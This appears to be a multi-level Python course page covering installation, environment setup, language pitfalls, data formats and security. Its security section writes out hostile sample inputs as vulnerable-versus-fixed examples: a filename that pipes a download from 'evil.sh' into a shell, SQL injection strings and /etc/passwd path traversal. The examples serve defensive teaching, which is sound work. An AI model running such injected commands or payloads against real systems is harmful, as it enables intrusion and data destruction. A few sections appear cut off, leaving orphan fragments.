Level 00 Orientation not started ~14 min

What Python actually is (and what it is not)

Most Python damage happens before the first line of code: wrong interpreter, wrong environment, wrong expectations. Before touching an installer, build the mental model.

Python is a language specification plus a reference implementation. CPython — the one you get from python.org, your distro, or uv — compiles your source to bytecode and executes it on a virtual machine. That distinction explains almost every confusing error message you will meet.

The five things that exist on disk

When you install "Python", you are really installing a layout. Learn it once and environment bugs stop being mysterious. python -m sysconfig | head -40 prints the real paths for the interpreter you are running.

Interpreter anatomy
ThingTypical Linux pathWhat it means
python3/usr/bin/python3The executable (often a symlink). Its version can differ from every other Python on the box.
stdlib/usr/lib/python3.13/Batteries included: json, pathlib, ssl, sqlite3. Owned by the OS or installer.
site-packages…/site-packages/Third-party packages. This is the directory virtual environments exist to isolate.
scripts/bin~/.local/bin, .venv/binConsole entry points (pytest, ruff). Must be on PATH to be callable by name.
config~/.config/pip/pip.confIndex URLs, caches, credentials. A wrong setting here breaks every install silently.

Four layers, one process

Python code lives in a stack of layers. Bugs that look like "Python is broken" are nearly always a mismatch between two adjacent layers.

  1. Language — syntax and semantics. Versioned by minor release (3.12, 3.13, 3.14, 3.15). New syntax can be unavailable on older interpreters, which is why requires-python exists.
  2. Standard library — ships with the interpreter, has the same version number, and is not installable via pip. Never pip install json; that package name is a squatter.
  3. Third-party packages — installed into a site-packages directory, resolved by sys.path order.
  4. Your project — source code plus a declaration of which of the above it needs.
bash · confirm what you are actually running
python3 -VV              # e.g. Python 3.13.7 (main, ...) [GCC 14.2.0]
which -a python3 python  # every Python on PATH, in resolution order
python3 -c 'import sys; print(sys.executable); print(sys.prefix); print(sys.path)'

That last command is the single most useful diagnostic in Python. sys.executable tells you which binary runs; sys.prefix tells you which environment it belongs to; sys.path tells you where imports will look, first match wins. If a package "is installed but cannot be imported", these three lines answer the question in seconds.

Bad decision #0 — "Python is installed, so I can pip install anything" There are usually three or more Pythons on a modern Linux machine: the OS one (/usr/bin/python3), a Homebrew or pyenv one, and one inside each project. pip on your PATH may belong to none of the ones you run. This is the root cause of the classic "I installed requests but Python says ModuleNotFoundError". The fix is not to reinstall — it is to stop calling bare pip. Use python -m pip, or better, activate the project environment first. Then pip cannot point at the wrong interpreter, because it is the interpreter.

Level 01 Installation locked ~22 min

Installing Python 3 without breaking the machine

There is no single "install Python" step. There are five legitimate strategies with different blast radii. Choosing the wrong one is how people end up with a broken desktop and a stack of Stack Overflow tabs.

First, a rule that will save you hours: never let a project depend on the operating system's Python. Your distro uses Python for system tooling — package managers, drivers, desktop utilities. Treat /usr/bin/python3 as read-only infrastructure and install your own interpreter for your own work.

Choose your strategy

Why "just use the latest" is not the whole answer Python's annual release cadence (October) means a brand-new minor version is often not yet supported by every C-extension you depend on. For production, the pragmatic choice in late 2026 is the newest version that your dependency set publishes wheels for — usually 3.13 or 3.14, moving to 3.15 after a few months. For learning, use the latest stable. Check the support table before you commit: 3.10 went end-of-life on 2026-10-01 and no longer receives security fixes.

Linux: the distro route

Debian and Ubuntu ship a solid CPython but split it across packages. The interpreter alone cannot create virtual environments — you need the venv module package, and pip is often absent by design.

bash · Debian 12/13, Ubuntu 24.04+
sudo apt update
sudo apt install -y python3 python3-venv python3-pip python3-dev build-essential

python3 -VV
python3 -m venv --help >/dev/null && echo "venv OK"
bash · Fedora / RHEL family
sudo dnf install -y python3 python3-pip python3-devel gcc redhat-rpm-config
# Versioned interpreters are separate packages, e.g.:
sudo dnf install -y python3.13 python3.13-pip
bash · Arch
sudo pacman -S --needed python python-pip
# Arch tracks the latest release; do not partial-upgrade around it.

On Ubuntu, newer interpreters are available from the deadsnakes PPA (sudo add-apt-repository ppa:deadsnakes/ppa). It is a genuine convenience, but the maintainers are explicit that timely security updates are not guaranteed. That is fine for a scratch machine and a poor default for production. Prefer uv, pyenv, or building from source when you need a version the distro does not ship.

Linux: the per-user route with uv

uv installs standalone CPython builds (from the python-build-standalone project) into your home directory. No root, no compilation, no system changes.

bash · uv (Astral)
curl -LsSf https://astral.sh/uv/install.sh | sh   # review the script first on servers
uv python install 3.14            # downloads a standalone build
uv python list                    # available + installed
uv python find 3.14               # absolute path to the interpreter
uv python pin 3.14                # writes .python-version for this project
Piping curl into sh Convenient, and a supply-chain habit worth breaking. For anything you care about, download the script, read it, verify the checksum/signature where the project provides one, then run it. The same applies to installers from any vendor — including Python-adjacent tooling. "It's from a well-known project" is not verification; a compromised release is still a release.

Linux: pyenv, when you need exact versions

bash · pyenv from source
# Build dependencies (Debian/Ubuntu)
sudo apt install -y make build-essential libssl-dev zlib1g-dev \
  libbz2-dev libreadline-dev libsqlite3-dev libffi-dev liblzma-dev \
  libncursesw5-dev xz-utils tk-dev libgdbm-dev uuid-dev

curl -fsSL https://pyenv.run | bash    # then add to ~/.bashrc as printed by the installer
exec "$SHELL" -l

pyenv install 3.13.7
pyenv versions
pyenv global 3.13.7        # default for your user
pyenv local 3.12.11        # per-directory override, writes .python-version

The classic pyenv failure is a silently missing libsqlite3-dev or libssl-dev: the build succeeds, then import sqlite3 or HTTPS fails. Always run the verification block below after any source build. On Debian/Ubuntu you can alternatively use the maintained python-build-standalone builds that uv and pyenv can consume.

Windows: the installer and the Store trap

  1. Download the Windows installer from python.org/downloads/windows. Avoid third-party "Python bundles".
  2. Tick Add python.exe to PATH on the first screen. If you miss it, re-run the installer and choose Modify rather than reinstalling blindly.
  3. Prefer the per-user install unless you have a reason; it avoids UAC-admin surprises with pip.
  4. Use the py launcher (py -0p lists installed versions, py -3.13 -m venv .venv selects one).
Bad decision — the Microsoft Store stub named python.exe Windows ships a zero-byte execution alias at %LOCALAPPDATA%\Microsoft\WindowsApps\python.exe that opens the Store. If it comes first on PATH, running python launches a shop instead of an interpreter, and some tools report "Python was not found". Fix it in Settings → Apps → Advanced app settings → App execution aliases by disabling the python.exe and python3.exe aliases, then ensure your real install's Scripts and root directory precede WindowsApps on PATH. Deleting the alias file directly is a worse idea — an update may recreate it.

macOS: two good options

bash · Homebrew vs official installer
brew install python@3.14        # installs to /opt/homebrew (Apple Silicon)
brew link --overwrite python@3.14
python3 -m venv .venv && source .venv/bin/activate

# Or: the universal2 installer from python.org (includes Tcl/Tk, IDLE, certifi bundle)
# Never use the system /usr/bin/python3 for project work: Apple ships it for Xcode tooling.

Homebrew's Python is externally managed too: brew install for tools, virtual environments for libraries. Do not pip install into it, and do not sudo a Homebrew Python.

Containers: the reproducibility escape hatch

bash · Docker
docker run --rm -it -v "$PWD":/app -w /app python:3.14-slim bash
# inside:
python -VV
pip install --no-cache-dir -r requirements.txt

Pin the full image tag or digest (python:3.14.0-slim-bookworm, or better a @sha256:… digest) for reproducibility. python:latest is a moving target and will break your build on a random Tuesday.

Verify the install like you mean it

Version output alone proves nothing: a Python can be present but unable to create environments, verify TLS certificates, or import its own standard library modules. Run the full check.

bash · post-install smoke test
python3 -VV
python3 -c "import sys, ssl, sqlite3, zlib, lzma, ctypes, hashlib; print(sys.executable); print(ssl.OPENSSL_VERSION); print(sqlite3.sqlite_version)"
python3 -m venv /tmp/pycheck && /tmp/pycheck/bin/python -m pip --version && rm -rf /tmp/pycheck
python3 -c "import urllib.request; print(urllib.request.urlopen('https://pypi.org', timeout=5).status)"

If the HTTPS request fails with a certificate error, you have a broken CA bundle (common with hand-built Pythons and minimal containers) — fix the bundle rather than reaching for verify=False. If venv fails on Debian/Ubuntu, install python3-venv. If import sqlite3 fails, the interpreter was compiled without SQLite headers.

Version management policy that scales

Dev machine

Latest stable + one older

Run 3.14/3.15 for new work, keep 3.12 or 3.13 installed so you can reproduce bug reports. uv python install 3.13 3.14 costs a few hundred MB and saves days.

CI

Matrix, not guesswork

Test the oldest version your requires-python allows and the newest stable. A matrix of five versions catches syntax and typing regressions early.

Production

One pinned minor

Pin the exact patch in the image (3.13.7-slim) and rebuild monthly for security patches. Upgrade minors deliberately, not automatically.

Bad decision — building with sudo make install Running ./configure && sudo make install overwrites /usr/local/bin/python3 and its stdlib, which sits ahead of the distro's Python on PATH. System tools that expect the distro build can then break in ways that are hard to trace, and uninstalling is genuinely painful (no package record). If you must build from source, use make altinstall and a --prefix inside your home directory, or use pyenv/uv, which do exactly that for you. The five minutes you save are repaid with interest the first time apt misbehaves.

Level 02 Configuration locked ~20 min

Post-install configuration: PATH, pip, and environment variables

A fresh install is a starting point, not a working system. This level is the difference between an interpreter you fight and one that behaves.

Configuration happens at three scopes: the shell (PATH and exported variables), the interpreter (site, .pth files, user site), and tooling (pip config, editor, git hooks). Get the order right and everything else composes.

1. PATH: the only config most people need

Programs are found through PATH, left to right. Console scripts installed with pip --user and pipx land in ~/.local/bin (Linux/macOS) or %APPDATA%\Python\Python3xx\Scripts (Windows). If that directory is missing from PATH, the install succeeds and the command "does not exist".

bash · make user scripts visible (Linux/macOS)
echo "$PATH" | tr ':' '\n' | grep -E '\.local/bin|\.venv|pyenv'
# Append once, in ~/.profile for POSIX shells, or ~/.zshrc / ~/.bashrc for interactive shells:
echo 'export PATH="$HOME/.local/bin:$PATH"' >> ~/.profile
exec "$SHELL" -l
command -v pytest ruff uv pipx
Which file: .bashrc, .profile, .zshrc? ~/.bashrc runs for interactive non-login shells; ~/.profile runs for login shells (and is read by most display managers); zsh uses ~/.zshrc + ~/.zprofile. GUI applications and systemd services often start without your interactive shell config, so a PATH that works in the terminal can still be missing under systemd. That is why services should call interpreters by absolute path (see Level 13), not rely on PATH.
Bad decision — alias python=python3 and alias pip=pip3 It feels harmless. It is not: aliases do not apply to scripts, cron, systemd, IDEs, or subprocess, so you get a machine that behaves one way interactively and another way in production. On Debian/Ubuntu, python is deliberately absent from the base system because Python 2-era tooling would silently pick it up. Worse, alias pip=pip3 hides which interpreter pip belongs to. The robust fix is to create a virtual environment and let python and pip both resolve inside .venv/bin. If you truly need a user-level python, use a symlink in ~/.local/bin pointing at a specific version and understand that every non-shell context will ignore it.

2. pip: configure it once, correctly

pip reads configuration from three scopes — global (/etc/pip.conf), user (~/.config/pip/pip.conf), and site (.venv/pip.conf) — plus PIP_* environment variables. Later scopes win, and command-line flags beat everything. Inspect before editing:

bash · pip configuration
python3 -m pip config debug        # every file considered, and its values
python3 -m pip config list
python3 -m pip --version           # confirm which pip, from which environment
python3 -m pip cache dir           # where wheels are cached
ini · ~/.config/pip/pip.conf
[global]
# Only change these if your organisation actually runs a mirror.
# index-url = https://pypi.org/simple
timeout = 20
retries = 3
disable-pip-version-check = true

[install]
# Fail loudly instead of silently drifting when a version is yanked.
prefer-binary = true
Bad decision — trusted-host as a permanent fix Adding trusted-host or --trusted-host disables TLS certificate verification for that index. People add it to silence corporate-proxy errors and then forget it exists; every package they install afterwards is trivially interceptable. The correct fixes are: install your organisation's CA certificate into the system trust store, point pip at it with cert = /path/ca.pem, or configure the proxy in pip.conf. If you inherit a machine with trusted-host set, treat it as a security finding.

3. The environment variables that matter

Python honours a set of PYTHON* variables at startup. A few are useful; several are dangerous because they change behaviour for every program you run. Use python -X option or -E/-I in scripts to ignore the environment entirely.

Why PYTHONPATH is usually a mistake It applies globally to every Python process in that shell, including tools like pip, ruff and pytest. Setting it to your project root can shadow an installed package with a local file of the same name — including stdlib names if you have a json.py or types.py lying around. The symptom is bizarre: import json fails, or a library behaves differently only on your machine. Install the project in editable mode (uv pip install -e . / pip install -e .) or run with python -m from the right directory instead.

4. Startup hooks: sitecustomize and .pth

Python imports site at startup, which can execute code on your behalf. Two mechanisms are worth knowing — one legitimate, one a favourite of attackers.

  • sitecustomize.py in site-packages: imported automatically if present. Legitimate for organisation-wide defaults (e.g. a metrics hook); surprising in shared environments.
  • *.pth files: each line is a path to add to sys.path, but lines beginning with import are executed. A malicious or careless .pth in site-packages is arbitrary code execution on every interpreter start.
bash · audit startup hooks
python3 -c "import site; print('\n'.join(site.getsitepackages()))"
find "$(python3 -c 'import site; print(site.getsitepackages()[0])')" -maxdepth 1 -name '*.pth' -print -exec cat {} \;
python3 -S -c "import sys; print(sys.path)"   # -S: skip site processing entirely

6. Locale, time, and encoding

Three configuration issues cause a large share of "works on my machine" bugs in text processing: the filesystem encoding, the default encoding of open(), and naive datetimes. Python 3.15 makes UTF-8 the default text encoding (PEP 686 rollout); on older versions, pass encoding="utf-8" explicitly to every open(), and never rely on the locale for file formats.

python · check the environment assumptions
import locale, sys, datetime as dt

print(sys.getfilesystemencoding(), sys.getdefaultencoding())
print(locale.getpreferredencoding(False))
print(dt.datetime.now().astimezone().tzinfo)   # your real UTC offset

# Portable, explicit, boring - the three qualities you want in I/O:
with open("report.csv", "w", encoding="utf-8", newline="") as fh:
    fh.write("id,name\n1,Zoë\n")
Bad decision — sudo pip install, then sudo everything else Installing system-wide with sudo mixes your packages into the distro's site-packages, where the package manager does not know about them. Files land root-owned, later upgrades conflict with distro packages, and the "fix" is always more sudo. On PEP 668 systems pip now refuses by default — that refusal is a feature, not an obstacle. Use a virtual environment per project, pipx for command-line tools, and uv tool as a faster equivalent. Even genuinely system-wide needs (a package required by a system service) belong in a dedicated environment owned by that service, not in /usr/lib/python3.

Level 03 Environments locked ~30 min required for Linux

venv, PEP 668, and the "externally managed" wall

On Debian 12+, Ubuntu 23.04+, Fedora 38+ and their derivatives, pip refuses to install into the system interpreter. This is not a bug and not a permissions problem. Understanding it is the single biggest Linux skill gap for Python newcomers.

In 2023 the Python packaging ecosystem standardised a marker file that tells pip: "this interpreter belongs to the operating system; do not modify it." That is PEP 668. The refusal message you will see is not an obstacle to work around — it is the OS protecting itself from you, and it is correct.

The error, verbatim

console · what PEP 668 looks like
$ pip install requests
error: externally-managed-environment

× This environment is externally managed
╰─> To install Python packages system-wide, try apt install
    python3-xyz, where xyz is the package you are trying to
    install.

    If you wish to install a non-Debian-packaged Python package,
    create a virtual environment using python3 -m venv path/to/venv.
    Then use path/to/venv/bin/python and path/to/venv/bin/pip. Make
    sure you have python3-full installed.

    If you wish to install a non-Debian packaged Python application,
    it may be easiest to use pipx install xyz, which will manage a
    virtual environment for you. Make sure you have pipx installed.

    See /usr/share/doc/python3.11/README.venv for more information.

note: If you believe this is a mistake, please contact your Python
installation or OS distribution provider. You can override this, at
the risk of breaking your Python installation or OS, by passing
--break-system-packages.
hint: See PEP 668 for the detailed specification.

Under the hood there is a file: /usr/lib/python3.13/EXTERNALLY-MANAGED. pip looks for it at startup; if it exists and you are not inside a virtual environment, installs are refused. You can see it yourself:

bash · inspect the marker
python3 -c "import sysconfig, pathlib; p = pathlib.Path(sysconfig.get_path('stdlib')) / 'EXTERNALLY-MANAGED'; print(p, p.exists()); print(p.read_text() if p.exists() else '')"
Why distributions do this Your desktop and server tools are Python programs: apt's front-ends, NetworkManager helpers, apport, dnf, cloud-init, firewalld, and hundreds of vendor scripts. They were tested against the exact library versions the distro shipped. A stray pip install --upgrade requests can replace a library under a system daemon, and the failure appears later as a crash in an unrelated service — with no package record to explain it. PEP 668 makes that class of breakage impossible by default. Fedora's change proposal, Debian's implementation, and the PyPA specification all say the same thing: the system interpreter is a runtime for OS software, not a workspace for your project.

What a virtual environment actually is

A venv is a directory containing a pyvenv.cfg file, a copy or symlink of the interpreter, and its own site-packages. When that interpreter starts, it sets sys.prefix to the venv and searches its site-packages instead of the base installation's. Activation is nothing but a PATH change plus a prompt hint — the isolation comes from the interpreter's location, not from source.

bash · anatomy of a venv
python3 -m venv .venv
find .venv -maxdepth 2 \( -name 'pyvenv.cfg' -o -name 'python*' -o -name 'site-packages' \) | sort
cat .venv/pyvenv.cfg
ini · .venv/pyvenv.cfg
home = /usr/bin
include-system-site-packages = false
version = 3.13.7
executable = /usr/bin/python3.13
command = /usr/bin/python3 -m venv /home/dev/project/.venv

Two consequences follow immediately:

  1. Do not move or copy a venv. The paths are baked in. Recreate it — it takes seconds and is deterministic if you have a lockfile.
  2. Do not commit it. Add .venv/ to .gitignore. It contains absolute paths, platform-specific binaries, and hundreds of megabytes of vendored code.

Language essentials that actually bite

You do not need to memorise the grammar. You need the dozen semantics that cause production bugs: mutability, name binding, exception scope, and the difference between "works" and "correct".

This level is not a beginner tutorial — it is the set of facts that experienced Python developers wish they had been told earlier. Every example is runnable, and each one corresponds to a real class of bug.

1. Names are labels, not boxes

Assignment binds a name to an object. It never copies. This single fact explains aliasing, mutable defaults, and half of all "why did my list change?" questions.

python · aliasing
a = [1, 2, 3]
b = a              # same object, two names
b.append(4)
print(a)           # [1, 2, 3, 4]  <- not a copy
print(a is b)      # True

c = a[:]           # shallow copy: new list, same element objects
print(a is c, a == c)   # False True

import copy
d = copy.deepcopy(a)    # recursive copy; needed for nested mutables
is vs == == asks "do these compare equal?" and calls __eq__. is asks "are these the same object?" and compares identity. Use is only for None, True, False, and sentinels you created. if x is 1000 may be true on one interpreter and false on another because small-integer caching is an implementation detail. The CPython REPL makes it worse by caching the last expression, so a test can pass interactively and fail in a script.

2. The mutable default argument trap

Broken
def add_item(item, bucket=[]):
    bucket.append(item)
    return bucket

print(add_item("a"))   # ['a']
print(add_item("b"))   # ['a', 'b']  !!
Default expressions are evaluated once, when the def executes. Every call shares the same list.
Correct
def add_item(item, bucket=None):
    if bucket is None:
        bucket = []
    bucket.append(item)
    return bucket

# Or, when a shared default is intentional:
def add_item(item, bucket=()):
    return [*bucket, item]
Use None as the sentinel, or an immutable type. Never a list, dict or set.

3. Exceptions: scope, chaining, and what not to catch

python · a small, honest exception hierarchy
class InventoryError(Exception):
    """Base class for all inventory failures."""

class SkuNotFound(InventoryError):
    def __init__(self, sku: str) -> None:
        super().__init__(f"unknown SKU: {sku!r}")
        self.sku = sku

def look_up(sku: str, catalog: dict[str, int]) -> int:
    try:
        return catalog[sku]
    except KeyError as exc:
        raise SkuNotFound(sku) from exc     # explicit cause, never silent

try:
    look_up("nope", {"abc": 3})
except SkuNotFound as exc:
    print(exc.sku, "->", exc)               # nope -> unknown SKU: 'nope'
except InventoryError:
    raise                                  # re-raise: you cannot handle it

Rules that prevent real incidents:

  • Catch the narrowest exception you can actually handle. except Exception: pass is how outages hide.
  • Use raise … from exc to preserve the cause. Losing the chain turns a five-minute fix into an afternoon.
  • else runs when no exception occurred; finally always runs. return inside finally swallows exceptions — never do it.
  • Exception messages are for humans; exception types are for code. Do not parse messages.
  • Never use exceptions for ordinary control flow in hot loops; use dict.get, getattr(obj, name, default), or an explicit check.
Bad decision — try: ... except Exception: pass It converts a loud, locatable failure into a silent wrong answer. A web handler that swallows exceptions returns 200 with corrupt data; a cron job that swallows exceptions exits 0 and nobody notices for a week. If you must catch broadly at a boundary (a worker loop, a request handler), log with a stack trace (logger.exception(...)) and either re-raise or return a defined failure result. "Best effort" code still has to report that it gave up.

5. Data modelling with dataclasses

Reach for @dataclass before writing a class with __init__, __repr__ and __eq__ by hand. Add frozen=True for value objects, slots=True for memory, and field(default_factory=...) for mutable fields.

python · a validated value object
from dataclasses import dataclass, field
from datetime import datetime
from decimal import Decimal

@dataclass(frozen=True, slots=True)
class LineItem:
    sku: str
    qty: int
    unit_price: Decimal
    tags: tuple[str, ...] = ()

    def __post_init__(self) -> None:
        if self.qty <= 0:
            raise ValueError(f"qty must be positive, got {self.qty}")
        if self.unit_price < 0:
            raise ValueError("unit_price cannot be negative")

    @property
    def total(self) -> Decimal:
        return self.unit_price * self.qty

item = LineItem(sku="A-100", qty=3, unit_price=Decimal("19.99"))
print(item)              # LineItem(sku='A-100', qty=3, unit_price=Decimal('19.99'), tags=())
print(item.total)        # 59.97
# item.qty = 4           # FrozenInstanceError: immutable by design

Why Decimal for money: 0.1 + 0.2 == 0.30000000000000004 in binary floating point. For prices, use Decimal from strings (never from a float) or integer cents.

6. Iteration, comprehensions, and generators

python · lazy pipelines
from pathlib import Path
from itertools import batched
import re

LOG = re.compile(r"^(?P<ip>\S+) \S+ \S+ \[[^\]]+\] \"(?P<verb>\w+) (?P<path>\S+)")

def parsed_lines(path: Path):
    """Yield parsed records lazily - constant memory, even for 10 GB files."""
    with path.open(encoding="utf-8", errors="replace") as fh:
        for line in fh:
            if m := LOG.match(line):
                yield m.groupdict()

counts: dict[str, int] = {}
for rec in parsed_lines(Path("access.log")):
    counts[rec["path"]] = counts.get(rec["path"], 0) + 1

top = sorted(counts.items(), key=lambda kv: kv[1], reverse=True)[:5]

for group in batched(top, 2):      # 3.12+: fixed-size tuples
    print(group)

Prefer generators for anything that can be larger than memory. A comprehension materialises a list; a generator expression does not: sum(x*x for x in range(10**7)) is fine, sum([x*x for x in range(10**7)]) allocates hundreds of megabytes.

7. Context managers: cleanup that cannot be forgotten

python · files, locks, transactions
from contextlib import contextmanager, suppress
import sqlite3, time

@contextmanager
def timed(label: str):
    start = time.perf_counter()
    try:
        yield
    finally:
        print(f"{label}: {time.perf_counter() - start:.3f}s")

with timed("import"), suppress(FileNotFoundError):
    with open("optional.csv", encoding="utf-8") as fh:
        rows = fh.read().splitlines()

# sqlite3 connections are context managers for *transactions*, not for closing:
with sqlite3.connect("app.db") as conn:
    conn.execute("CREATE TABLE IF NOT EXISTS kv (k TEXT PRIMARY KEY, v TEXT)")
    conn.execute("INSERT OR REPLACE INTO kv VALUES (?, ?)", ("build", "2026.10"))

Use with for every resource: files, sockets, database connections/transactions, locks, temporary directories (tempfile.TemporaryDirectory), and archive members. If a tutorial opens a file without with, it is teaching you a leak.

8. Typing that pays for itself

Type hints do not affect runtime performance and are not enforced at runtime. Their value is in editors and CI: refactors become mechanical, and half of the "wrong shape of data" bugs never ship. Start with public function signatures; do not annotate every local.

python · 3.12+ syntax
from collections.abc import Iterable, Iterator
from dataclasses import dataclass
from typing import Literal, Protocol, TypeAlias

type Json = None | bool | int | float | str | list["Json"] | dict[str, "Json"]

class Repository(Protocol):
    def get(self, key: str) -> bytes | None: ...
    def put(self, key: str, value: bytes) -> None: ...

@dataclass
class Cache:
    store: Repository
    mode: Literal["read", "write", "readwrite"] = "readwrite"

    def warm(self, keys: Iterable[str]) -> Iterator[str]:
        for key in keys:
            if self.store.get(key) is not None:
                yield key

def head[T](items: Iterable[T], n: int = 1) -> list[T]:   # PEP 695 generics
    return [item for _, item in zip(range(n), items)]
bash · enforce in CI
mypy --strict src/          # strict from day one on new code

ruff check --select ANN     # flags missing annotations, if you want that
Why Protocol instead of inheritance Python is structurally typed. A Protocol says "anything with these methods qualifies", so your cache does not need to import — or inherit from — a base class in your framework. That keeps test doubles trivial and prevents the classic import cycle caused by an ABC. If you control the hierarchy and want nominal typing, use abc.ABC; if you are describing a capability, use Protocol.

    tmp = path.with_suffix(path.suffix + ".tmp")
    with tmp.open("w", encoding="utf-8") as fh:
        fh.write(data)
        fh.flush()
        os.fsync(fh.fileno())
    os.replace(tmp, path)      # atomic on POSIX and Windows

shutil also gives you rmtree, disk_usage, make_archive, unpack_archive, and which. If you are shelling out to cp -r, rm -rf or df, check first — the Python version is portable and testable.

Data formats: json, csv, tomllib, configparser

python · read, write, validate
import csv, json, tomllib
from pathlib import Path

# JSON: text, explicit encoding, and a clear error path.
try:
    payload = json.loads(Path("config.json").read_text(encoding="utf-8"))
except json.JSONDecodeError as exc:
    raise SystemExit(f"config.json is invalid at line {exc.lineno}, col {exc.colno}: {exc.msg}")

# Write JSON that humans and diffs can read; sort_keys makes changes reviewable.
Path("out.json").write_text(json.dumps(payload, indent=2, sort_keys=True) + "\n", encoding="utf-8")

# CSV: always newline="" on write, and let the module handle quoting.
with Path("report.csv").open("w", encoding="utf-8", newline="") as fh:
    writer = csv.DictWriter(fh, fieldnames=["sku", "qty", "note"])
    writer.writeheader()
    writer.writerow({"sku": "A-100", "qty": 3, "note": "has, comma"})
    writer.writerow({"sku": "B-200", "qty": 1, "note": 'quoted "text"'})

# TOML (3.11+): binary mode is required by the spec.
with Path("pyproject.toml").open("rb") as fh:
    project = tomllib.load(fh)

Why not parse CSV with line.split(",") Because CSV is not "commas separated values" — it is a quoting format. Fields can contain commas, newlines, and doubled quotes. Splitting by comma silently corrupts addresses ("Springfield, IL"), multi-line notes, and Excel exports. The csv module handles dialects, quoting, and embedded newlines, and reads a file incrementally. The same reasoning applies to JSON (use json, never regex), TOML, and YAML (yaml.safe_load, Level 07).

Bad decision — print() as a logging system print has no levels, no timestamps, no logger names, no filtering, and no way to route it. In a container it interleaves with other output and arrives unflushed by default. When something breaks at 03:00, you cannot turn up the volume on a print. Use logging from the first line of a real program, even if the handler is just stderr. And logging.basicConfig(level=DEBUG) at import time in a library is worse: it hijacks the application's configuration. Libraries should add a NullHandler and stay quiet.

Databases: sqlite3

python · parameterised SQL and transactions

SQLite is a genuinely excellent production database for single-node applications: ACID, zero administration, one file. It is the wrong choice for many concurrent writers across machines. That trade-off belongs in a design document, not in a comment.

Concurrency: threads, processes, and asyncio

python · pick the right concurrency model
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
import asyncio, httpx, time

URLS = [f"https://example.com/{i}" for i in range(20)]

# I/O-bound, sync code: threads. Simple, bounded, no event loop.
def fetch_all_sync() -> list[int]:
    def one(url: str) -> int:
        with httpx.Client(timeout=5.0, follow_redirects=False) as client:
            return client.get(url).status_code
    with ThreadPoolExecutor(max_workers=8) as pool:
        return list(pool.map(one, URLS))

# CPU-bound: processes. Each worker gets its own GIL.
def cpu_task(n: int) -> int:
    return sum(i * i for i in range(n))

def crunch() -> list[int]:
    with ProcessPoolExecutor(max_workers=4) as pool:
        return list(pool.map(cpu_task, [2_000_000] * 4))

# I/O-bound, async: one thread, explicit concurrency limit.
async def fetch_all_async() -> list[int]:
    limits = httpx.Limits(max_connections=10)
    async with httpx.AsyncClient(timeout=5.0, limits=limits) as client:
        results = await asyncio.gather(*(client.get(u) for u in URLS))
        return [r.status_code for r in results]

# 3.11+: structured concurrency, cancels siblings on failure.
async def main() -> None:
    async with asyncio.TaskGroup() as tg:
        for url in URLS[:3]:
            tg.create_task(httpx.AsyncClient(timeout=5).get(url))

if __name__ == "__main__":
    t0 = time.perf_counter()
    print(fetch_all_sync()[:3], f"{time.perf_counter() - t0:.2f}s")
    print(asyncio.run(fetch_all_async())[:3])

Security: the defaults are not on your side

Python gives you sharp tools and few guardrails. The dangerous patterns are short, idiomatic, and copy-pasted across the internet. This level shows each one next to its fix, and explains what an attacker actually does with it.

Security work starts with a threat model, not a checklist. Ask three questions for every program: what data crosses a trust boundary? (network, files, subprocess output, environment), what can an attacker control? and what is the worst outcome if that input is hostile? Then design so the worst outcome is not reachable.

1. Validate input by structure, not by blocklist

Blocklist — always incomplete
name = request.args["name"]
if "'" in name or ";" in name:
    abort(400)
# Unicode, encoding, numeric context,
# and second-order injection all bypass it.
Allowlist + parse
import re
RAW = re.compile(r"\A[A-Za-z0-9_-]{1,32}\Z")

def parse_username(raw: str) -> str:
    if not RAW.fullmatch(raw):
        raise ValueError("invalid username")
    return raw
Define the exact shape you accept, then reject everything else. Length limits are security controls.

Validate at the boundary (HTTP handler, CLI parser, file reader), then pass typed values inward. Do not re-validate in every layer, and never "sanitise" by stripping characters: mangling input creates new bugs and does not stop injection. Parse it into a safe representation or reject it.

Size is an attack surface Unbounded reads are a denial-of-service primitive: a 10 GB JSON body, a zip bomb, a regex with catastrophic backtracking, an image with huge dimensions. Enforce maximum content length at the proxy and in code; stream large payloads; set timeouts on all network calls; bound loops that consume user-controlled collections.

2. Injection: four places it hides

SQL

String interpolation = SQL injection
sku = request.args["sku"]
cur.execute(f"SELECT * FROM items WHERE sku = '{sku}'")
# sku = "x' OR '1'='1"  -> dumps the table
# sku = "x'; DROP TABLE items; --" -> gone
Bound parameters
cur.execute("SELECT * FROM items WHERE sku = ?", (sku,))
# Identifiers cannot be bound. Allowlist them:
SORT = {"name": "name", "price": "unit_price"}
order = SORT.get(request.args.get("sort"), "name")
cur.execute(f"SELECT * FROM items ORDER BY {order}")

Binding works for values only. Column names, table names, and ASC/DESC must come from a fixed allowlist — never from input, even with quoting. ORMs help but do not save you: .raw(), .extra(), and text() with concatenation re-open the hole.

Shell

python · command injection
filename = request.form["filename"]      # attacker: "; curl evil.sh | sh"

# VULNERABLE: the shell parses the attacker's metacharacters.
os.system(f"convert {filename} -resize 50% out.png")

# VULNERABLE too: shell=True with interpolation.
subprocess.run(f"convert {filename} -resize 50% out.png", shell=True)

# CORRECT: argv list, no shell, plus an explicit path/allowlist.
if Path(filename).name != filename:
    raise ValueError("filename must not contain a path")
subprocess.run(["convert", filename, "-resize", "50%", "out.png"], check=True, timeout=30)

Filesystem

python · path traversal
from pathlib import Path

BASE = Path("/srv/reports").resolve()

def safe_report(name: str) -> Path:
    # "..." and absolute paths are the attack: Path(BASE) / "/etc/passwd" == Path("/etc/passwd")
    candidate = (BASE / name).resolve()
    if not candidate.is_relative_to(BASE):
        raise PermissionError("path escapes base directory")
    if candidate.suffix not in {".pdf", ".csv"}:
        raise PermissionError("unsupported file type")
    return candidate

Two subtleties: os.path.join("/srv", "/etc/passwd") returns /etc/passwd because an absolute second argument replaces the base, and .. segments are resolved by the OS later than your check unless you resolve(). Symlinks inside the base are also an escape — resolve() handles them, which is why it is not optional here.

Logs and headers

User input containing \n can forge log lines; user input in response headers enables header injection; user input in an email subject can inject headers. Normalise and encode at the sink, and prefer structured JSON logs over string formatting. Never put raw input into eval, exec, format_map on untrusted templates, or a shell.

3. Deserialisation: the most dangerous line in Python

Remote code execution, by design
import pickle, yaml

# Both of these execute attacker-chosen code.
obj = pickle.loads(request.data)

cfg = yaml.load(request.data, Loader=yaml.Loader)

# marshal is also unsafe and not for persistence.
pickle is a program format, not a data format. Its docs say so explicitly. There is no safe subset for untrusted input, and no amount of validation makes it safe.
Data formats + signature checks
import json, yaml, hmac, hashlib

obj = json.loads(request.data)       # data only

cfg = yaml.safe_load(request.data)   # safe subset

# If data must be authenticated, verify an HMAC
# over the raw bytes before parsing:
expected = hmac.new(secret, body, hashlib.sha256).hexdigest()
